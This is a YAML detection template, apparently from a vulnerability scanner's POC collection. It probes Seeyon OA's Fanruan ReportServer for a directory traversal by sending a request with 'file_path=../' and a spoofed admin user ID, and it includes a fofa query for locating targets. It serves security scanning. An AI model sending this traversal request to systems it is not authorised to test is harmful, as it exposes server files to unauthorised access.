# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - <NODES
          - </NODES>
          - xmlVersion
          - releaseVersion
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true'
id: seeyon-reportserver-directory-travesal
info:
  author: zan8in
  description: |
    致远OA 帆软组件 ReportServer 接口存在目录遍历漏洞,攻击者通过漏洞可以获取服务器敏感信息
    fofa: title="致远A8-V5协同管理软件 V6.1sp1"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 致远OA 帆软组件 ReportServer 目录遍历漏洞
  severity: high
  tags: seeyon,fanruan,reportserver,directory,traversal,argus-import
